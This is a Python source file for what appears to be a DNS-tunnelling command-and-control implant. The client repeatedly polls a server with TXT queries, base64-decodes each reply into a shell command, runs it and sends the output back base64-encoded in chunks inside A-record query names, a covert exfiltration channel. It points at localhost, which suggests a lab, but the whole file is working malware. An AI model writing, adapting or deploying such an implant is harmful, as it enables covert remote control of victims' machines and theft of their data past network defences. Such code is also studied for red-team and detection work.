import socket
import base64
import subprocess
import time
import struct
import random
import shlex

class Client:
	def __init__(self, server_ip, port, domain):
		self.server_ip = server_ip
		self.port = port
		self.domain = domain
		self.client_id  = 'target-client'
		self.last_cmd = None
	
	
	def generate_query(self, qname, qtype="TXT"):
		
		pckt_id = random.randint(0, 65535)
		header = struct.pack(">HHHHHH", pckt_id, 0x0100, 1, 0, 0, 0)

		encoded = b""
		for part in qname.encode('ascii').split(b"."):
			encoded += bytes([len(part)]) + part
			question = encoded + b"\x00"
		
		lam = (lambda qtype: 16 if qtype == "TXT" else 1)
		qtype_code = lam (qtype)
 			
		question_tail = struct.pack(">HH", qtype_code, 1)  		
		return header + question + question_tail
		

		
	def parse_response(self, data):
			
		header = struct.unpack(">HHHHHH", data[:12])
		ancount = header[3] 	
		pos = 12
				
		while pos < len(data) and data[pos] != 0:
			pos += data[pos] + 1
		pos += 5 
		
		for _ in range(ancount):
			lam = (lambda pos: pos + 2 if data[pos] else pos)
			pos = lam(pos)

			rtype, rclass, ttl, rdlength = struct.unpack(">HHIH", data[pos:pos+10])
			pos += 10
			
			if rtype == 16: 
				txt_data = data[pos:pos+rdlength]
				txt_strings = []
				txt_pos = 0
				while txt_pos < len(txt_data):
					length = txt_data[txt_pos]
					txt_pos += 1
					txt_strings.append(txt_data[txt_pos:txt_pos+length].decode('latin-1'))
					txt_pos += length
				
				return "".join(txt_strings)
				
				
	def prepare_query(self, output):		
		encoded_output = base64.b64encode(output.encode()).decode()
		encoded_output = encoded_output.replace('=', '').replace('/', '_').replace('+', '-')		
		max_chunk_size = 30
		if encoded_output:
			chunks = [encoded_output[i:i+max_chunk_size] for i in range(0, len(encoded_output), max_chunk_size)]
			total_chunks = len(chunks)			
			for i, chunk in enumerate(chunks):
				qname = f"{self.client_id}.output.chunk.{i}.{total_chunks}.{chunk}.{self.domain}"				
				response = self.send_query(qname, "A")				
				time.sleep(0.1)
			
			return True	
			
			
	def send_query(self, qname, qtype="TXT"):
		try:
			query_data = self.generate_query(qname, qtype)
			with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
				sock.settimeout(10)
				sock.sendto(query_data, (self.server_ip, self.port))
			
				data, addr = sock.recvfrom(1024)
				sock.close()
			
				if qtype == "TXT":
					txt_data = self.parse_response(data)
					return txt_data
				else:
					return "ACK"
			

		except Exception as error:
			pass					



	
	def execute_cmd(self, cmd):
		try:
			if isinstance(cmd, str):
				args = shlex.split(cmd)
			else:
				args = cmd
				
			result = subprocess.run(
				args,		   
				shell=False,	
				capture_output=True,
				text=True,
				timeout=30
			)
			return result.stdout or result.stderr
		except Exception as error:
			return f"Error: {str(error)}"
					
	def run(self):
		while True:
			try:
				qname = f"{self.client_id}.{self.domain}"				
				response = self.send_query(qname, "TXT")
				
				if response:
					encoded_cmd = response.strip('"')
					
					padding = 4 - (len(encoded_cmd) % 4)
					if padding != 4:
						encoded_cmd += '=' * padding
					cmd = base64.b64decode(encoded_cmd).decode('utf-8')
					if cmd != self.last_cmd:
						self.last_cmd = cmd
						output = self.execute_cmd(cmd)
						self.prepare_query(output)
			except KeyboardInterrupt:
				print("\n[+] Agent shutting down...")
				break
		
		return True

if __name__ == "__main__":
	server_ip = "127.0.0.1"
	port = 9876
	domain = "testdns.code"	
	client = Client(server_ip, port, domain)
	client.run()
